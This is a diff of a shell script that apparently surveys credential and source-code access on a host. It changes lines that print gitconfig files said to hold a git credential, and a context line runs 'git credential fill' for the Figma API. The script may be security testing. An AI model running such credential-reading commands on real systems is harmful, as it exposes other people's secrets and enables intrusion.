@@ -86,8 +86,8 @@ P ''
 # =============================================================
 P '=== 2. SOURCE CODE ACCESS ==='
 P ''
-P '--- /home/foundry/.gitconfig (ugit credential) ---'
-cat /home/foundry/.gitconfig 2>/dev/null >&3 || P 'no gitconfig'
+P '--- /home/foundry/gitconfig (ugit credential via GIT_CONFIG_SYSTEM) ---'
+cat /home/foundry/gitconfig 2>/dev/null >&3 || cat /home/foundry/.gitconfig 2>/dev/null >&3 || P 'no gitconfig'
 P ''
 P '--- git credential fill ---'
 echo "url=https://api.figma.com" | git credential fill 2>&1 | head -10 >&3
